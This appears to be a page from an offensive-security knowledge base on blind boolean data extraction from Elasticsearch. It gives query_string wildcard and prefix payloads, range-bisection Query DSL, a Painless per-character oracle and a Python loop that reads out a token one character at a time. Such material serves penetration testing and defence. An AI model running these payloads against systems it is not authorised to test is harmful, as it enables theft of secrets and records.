---
title: "Elasticsearch blind boolean data extraction"
order: 4
description: "When only hit-or-no-hit is observable, crafted field conditions on query_string, Query DSL, or script queries let an attacker infer and extract document values character by character."
keywords:
  - blind injection
  - boolean-based inference
  - Elasticsearch
  - data extraction
  - prefix query
  - character extraction
---

# Blind boolean extraction

Many injectable Elasticsearch endpoints never return the sensitive document; they expose only a binary signal: results appeared, or they did not. A login that succeeds, a "no matches" banner, a differing HTTP status, or a changed `hits.total` is enough. Boolean-based blind extraction turns that one bit into a full read by asking a series of true/false questions whose answers spell out the target value.

## The oracle

Any injectable surface that lets you add a condition works. With `query_string`, append a clause and watch whether the known-present document still comes back:

```
name:target AND secret:A*
```

If the document matches, the secret starts with `A`; if it drops out, it does not. The same logic expresses through a `bool` clause or a `script` query.

## Prefix walking with wildcards

Wildcard and prefix queries confirm one character position at a time. Anchor on a document you know exists, then extend the prefix:

```
id:42 AND token:a*
id:42 AND token:b*
...
id:42 AND token:f*      ← hit: first char is 'f'
id:42 AND token:fa*     ← test second char
id:42 AND token:fb*
```

Each confirmed prefix narrows the next guess to a single alphabet sweep. For a token over charset of size *n* and length *L*, extraction costs at most *n × L* requests, reducible with binary search over ranges (below).

## Range bisection

Ranges halve the search space per request instead of scanning linearly. Against a numeric or lexicographic field:

```json
{ "bool": { "must": [
    { "term": { "id": 42 } },
    { "range": { "balance": { "gte": 50000 } } }
  ] } }
```

Narrow `gte`/`lte` by bisection until the bound pins the exact value. For string fields, range bounds on `keyword` subfields order lexically, so `{"range":{"token.keyword":{"gte":"fm","lt":"fn"}}}` tests a prefix range.

## Scripted character oracle

Where a `script` query is injectable, Painless reads a character directly, giving a clean per-position test independent of analyzer behavior:

```json
{ "query": { "script": { "script": {
    "source": "doc['id'].value == 42 && doc['token'].value.charAt(params.i) == params.c",
    "params": { "i": 0, "c": "f" }
} } } }
```

Iterate `i` across positions and `c` across the charset; a hit confirms the character. `.length()` first bounds the loop:

```painless
doc['id'].value == 42 && doc['token'].value.length() == 64
```

## Driving it

The loop is identical to blind SQL extraction and automates cleanly:

```python
charset = "0123456789abcdef"      # adjust per field
known = ""
while True:
    for c in charset:
        q = f"id:42 AND token:{known}{c}*"
        if hit(search(q)):         # hit() = document present in response
            known += c
            break
    else:
        break                      # no extension matched: value complete
print(known)
```

`hit()` encapsulates whatever distinguishes true from false for the target: presence in `hits`, a non-zero `hits.total.value`, a redirect, or a timing delta where only latency differs. Starting from a document you control (one you created, or a guessable public record) gives a stable anchor so every question isolates a single unknown field.

## Tools

- **curl**: issue search requests and read the hit-or-no-hit signal driving the oracle.
- **Burp Intruder**: automate per-character prefix and range probes.

## References

- [Elasticsearch: Prefix query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-prefix-query.html)
- [Elasticsearch: Range query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-range-query.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
